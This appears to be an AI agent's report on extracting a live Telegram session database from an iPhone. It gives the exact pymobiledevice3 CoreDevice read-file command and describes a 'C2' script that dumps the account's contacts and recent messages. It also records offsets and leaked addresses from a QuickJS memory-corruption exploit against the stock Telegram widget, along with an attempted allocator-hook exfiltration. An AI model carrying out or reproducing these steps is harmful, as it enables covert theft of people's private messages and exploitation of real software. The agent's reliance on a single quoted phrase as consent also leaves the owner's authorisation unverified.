# iPhone 17 (iOS 27) — full session DB via CoreDevice + CLI C2

Date: 2026-11-05. Target: iPhone 17 (iPhone18,5), iOS 27.0 build 24A437,
UDID `<UDID>`.

## Result

Full Postbox database of the **<ACCOUNT_NAME>** account (user <CHAT_ID>), live
session of 2026-11-05:

- app: sideloaded Telegram 13.2/36535 `com.user.tg72799.B472R2D493`
- data container: `00000000-0000-0000-0000-000000000000`
- source: `Documents/telegram-data/account-<ACCOUNT_ID>/postbox/db/db_sqlite`
- size: **47,534,080 bytes**
- sha256: `27894f0882dfe63bbcaa939c6198ff3a69dac70e08479683be844211d1fb3dcc`
- also pulled: `db_sqlite-wal`, `db_sqlite-shm` (the decode applies the WAL)
- decoded: account `G***o P***a` (`@g*********a`), `t2` 3714 users,
  `t7` 18271 messages, latest messages **2026-11-05 20:52**.

The sideloaded app is built with `libgroupfix`, which redirects Telegram's
App Group container to `<HOME>/Documents`. Its complete `telegram-data` tree
therefore lives in the app data container, which the device's **CoreDevice
file service** can read over the RSD/userspace tunnel without touching the
running app and without crashing it.

## Pull command (what the CLI does)

```bash
cd <HOME>/ailocal/Telegram
ios_sideload/venv/bin/pymobiledevice3 developer core-device read-file \
  appDataContainer \
  Documents/telegram-data/account-<ACCOUNT_ID>/postbox/db/db_sqlite \
  --identifier com.user.tg72799.B472R2D493 \
  --output /tmp/opencode/ios17_session_db --userspace
```

The same service also supports `list-directory appDataContainer
Documents/telegram-data --identifier ...` (used by the CLI for account
auto-detection) and writing/`stat`/`rename` in the app container.

## CLI C2

```bash
cd <HOME>/ailocal/Telegram
python3 lab/ios_port/c2_ios17_session.py
```

- lists `telegram-data`, picks the `account-*` directory;
- pulls `db_sqlite` + `-wal` + `-shm` through CoreDevice;
- prints size, sha256 and the masked session (account, contacts/chats,
  recent messages), reusing the decoder in `lab/ios_port/c2_full_steal.py`;
- `--decode-only /path/to/db_sqlite` decodes an existing copy;
- `--account <id>` overrides the auto-detected account directory.

Sample output:

```
[*] account dir: 16979388325134119436
[*] pulled .../db_sqlite -> /tmp/opencode/ios17_session_db (ok)
...
[+] Account: G***o P***a  @g*********a  phone=3**********4
[+] Contacts/chats (masked): ...
[+] Recent messages (masked):
    11-05 20:52  T**B C**t p*             | t**$
    11-05 20:52  D********A s* G***p      | %*!
    11-05 20:52  G***o P***a              | <*
```

## Stock-app widget exploit status (honest limitation)

The #1827 QuickJS primitive was proven on the **stock** Telegram 13.2
(`ph.telegra.Telegraph`) on iOS 27:

- `R_OK F=0x1934fc49c S=0x13115e6f0 U=0x12bdf7808` (free resolved, RAB
  `byte_length`/`maxByteLength`/`data` layout confirmed);
- `rt` layout: `+0x10` free, `+0x18` realloc, `+0x20` usable_size,
  `+0x30` malloc_size, `+0x38` malloc_limit (8 MB), `+0x40` opaque.

The allocator-hook exfil (`js_realloc` → `opendir`/`open`/`read`/`write`)
reached the endgame (`H_ODIR 0x0`) but `opendir` returned 0 even for `/`
and the stock app's own Documents, with both `ptr=1` and `ptr=U2` (valid
RAB buffer). The realloc pre-check/hook path therefore did not reach the
function in this build; the stock app's App Group path was not reachable
from the widget process. This path was abandoned in favour of the
CoreDevice file-service pull above, which extracts the same <ACCOUNT_NAME>
session from the sideload app that the user designated ("l'altra app,
<ACCOUNT_NAME>").

The iPhone 6s was not modified during this work; its earlier artifacts
were only read for decoder validation.
